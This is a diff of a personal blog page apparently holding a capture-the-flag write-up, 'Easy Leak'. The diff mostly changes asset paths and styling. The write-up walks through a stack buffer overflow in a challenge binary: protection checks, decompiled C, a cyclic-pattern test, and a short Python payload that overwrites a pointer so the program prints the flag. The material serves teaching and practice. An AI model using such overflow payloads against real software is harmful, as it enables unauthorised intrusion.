@@ -2,7 +2,7 @@
 <html lang="en-us">
   <head>
     <title>Easy Leak // R1x0n</title>
-    <link rel="stylesheet" type="text/css" href="static/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/site/static/css/style.css">
     <link rel="shortcut icon" href="/favicon.ico" />
       <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
 
@@ -17,12 +17,12 @@
     
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Easy Leak"/>
-<meta name="twitter:description" content="Goal of the exercise Have the program to print the contents of the flag file.
+<meta name="twitter:description" content=".logo{ display: none !important; }  Goal of the exercise Have the program to print the contents of the flag file.
 Research And Reverse Engineering Test See if there are any protections: It appears to be only “NX” enabled.
 Decompiled C code of the executable: int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { FILE *stream; // [rsp&#43;0h] [rbp-50h]  char s1; // [rsp&#43;10h] [rbp-40h]  char *s; // [rsp&#43;30h] [rbp-20h]  const char *v6; // [rsp&#43;38h] [rbp-18h]  const char *v7; // [rsp&#43;40h] [rbp-10h]  unsigned __int64 v8; // [rsp&#43;48h] [rbp-8h]  v8 = __readfsqword(0x28u); memset(&amp;s1, 0, 0x38uLL); s = &#34;[!"/>
 
     <meta property="og:title" content="Easy Leak" />
-<meta property="og:description" content="Goal of the exercise Have the program to print the contents of the flag file.
+<meta property="og:description" content=".logo{ display: none !important; }  Goal of the exercise Have the program to print the contents of the flag file.
 Research And Reverse Engineering Test See if there are any protections: It appears to be only “NX” enabled.
 Decompiled C code of the executable: int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { FILE *stream; // [rsp&#43;0h] [rbp-50h]  char s1; // [rsp&#43;10h] [rbp-40h]  char *s; // [rsp&#43;30h] [rbp-20h]  const char *v6; // [rsp&#43;38h] [rbp-18h]  const char *v7; // [rsp&#43;40h] [rbp-10h]  unsigned __int64 v8; // [rsp&#43;48h] [rbp-8h]  v8 = __readfsqword(0x28u); memset(&amp;s1, 0, 0x38uLL); s = &#34;[!" />
 <meta property="og:type" content="article" />
@@ -44,14 +44,15 @@ Decompiled C code of the executable: int __cdecl __noreturn main(int argc, const
           <a class="app-header-menu-item" href="/site/tags/">Tags</a>
       </nav>
       
-      <p>👶🏽 : 1998, Lugano CH <br>📍: Lugano CH</p>
+      <p>👶🏽 : 1998, Lugano CH <br>📍: Lugano CH<br><a href="javascript:alert('not implemented\n sorry ¯\\_(ツ)_/¯')">📧</a></p>
+      
 
 
 
       
 
       
-        <script src='https://cldup.com/S6Ptkwu_qA.js'></script><script  src="static/utils/script.js"></script>
+        <script src='https://cldup.com/S6Ptkwu_qA.js'></script><script  src="/site/static/utils/script.js"></script>
     </header>
     <main class="app-container">
       
@@ -63,11 +64,17 @@ Decompiled C code of the executable: int __cdecl __noreturn main(int argc, const
       </h1>
     </header>
     <div class="post-content">
-      <h2 id="goal-of-the-exercise">Goal of the exercise</h2>
+      <style>
+.logo{
+display: none !important;
+}
+
+</style>
+<h2 id="goal-of-the-exercise">Goal of the exercise</h2>
 <p>Have the program to print the contents of the flag file.</p>
 <h2 id="research-and-reverse-engineering-test">Research And Reverse Engineering Test</h2>
 <p>See if there are any protections:
-<img src="static/checksec.png" width="50%" height="50%" align="center" class="center">
+<img src="/site/posts/cyber-challenge/static/checksec.png" width="50%" height="50%" align="center" class="center">
 It appears to be only “NX” enabled.</p>
 <h2 id="decompiled-c-code-of-the-executable">Decompiled C code of the executable:</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
@@ -107,18 +114,18 @@ It appears to be only “NX” enabled.</p>
 <li>The program will always print * v7</li>
 </ul>
 <h3 id="lets-try-the-program">Let’s try the program:</h3>
-<img src="static/program.png" width="1000%" height="100%" align="center" class="center">
+<img src="/site/posts/cyber-challenge/static/program.png" width="1000%" height="100%" align="center" class="center">
 Actually the program printed the string to which *v7 points.
 <h2 id="actual-analysis-and-exploitation-begins-here">Actual Analysis And Exploitation Begins Here</h2>
 <p>Let’s try to take control of “RIP” using a Cyclic string:
-<img src="static/ripReg.png" width="70%" height="70%" align="center" class="center">
+<img src="/site/posts/cyber-challenge/static/ripReg.png" width="70%" height="70%" align="center" class="center">
 The program goes into error due to a fault address, but apparently it is not the value we entered.
 We can check it with a Cyclic query:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rixon@killer-VirtualBox:~/Desktop/challenge/easyleak$ cyclic -l 0x7ffff7a5bcc0
 <span style="color:#f92672">[</span>CRITICAL<span style="color:#f92672">]</span> Subpattern must be <span style="color:#ae81ff">4</span> bytes
 </code></pre></div><p>This shows the presence of control on the stack!</p>
 <h2 id="assembly-code-analysis">Assembly code analysis</h2>
-<img src="static/assembly.png" width="70%" height="70%" align="center" class="center">
+<img src="/site/posts/cyber-challenge/static/assembly.png" width="70%" height="70%" align="center" class="center">
 <p>Pointers are initialized in the red outline, in sequence:</p>
 <ul>
 <li>char *s = 0x40087f</li>
@@ -127,10 +134,10 @@ We can check it with a Cyclic query:</p>
 </ul>
 <p>So our goal is to change &ldquo;0x4008c0&rdquo; in something else.</p>
 <h3 id="lets-see-how">Let&rsquo;s see how</h3>
-<img src="static/strncmp.png" width="50%" height="50%" align="center" class="center">
+<img src="/site/posts/cyber-challenge/static/strncmp.png" width="50%" height="50%" align="center" class="center">
 The "strncmp" is done in the red outline, so the flag value is in this memory zone. Precisely in "0x6010a0".
 <p>Let&rsquo;s see where these values are stored in memory thanks to a breakpoint immediately after the &ldquo;gets&rdquo;:
-<img src="static/value.png" width="50%" height="50%" align="center" class="center"></p>
+<img src="/site/posts/cyber-challenge/static/value.png" width="50%" height="50%" align="center" class="center"></p>
 <h3 id="so-the-script-we-need-is-the-following-xpy">So the script we need is the following (x.py):</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> struct<span style="color:#f92672">,</span> sys 
 junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>
@@ -139,7 +146,7 @@ payload <span style="color:#f92672">=</span> junk<span style="color:#f92672">+</
 <span style="color:#66d9ef">print</span>(payload)
 sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
 </code></pre></div><h3 id="the-result-of-the-script-its-the-following">The result of the script it&rsquo;s the following:</h3>
-<img src="static/flag.png" width="70%" height="70%" align="center" class="center">
+<img src="/site/posts/cyber-challenge/static/flag.png" width="70%" height="70%" align="center" class="center">
 As we can see now the program prints the flag value.
 <h2 id="job-done">JOB DONE!</h2>
 
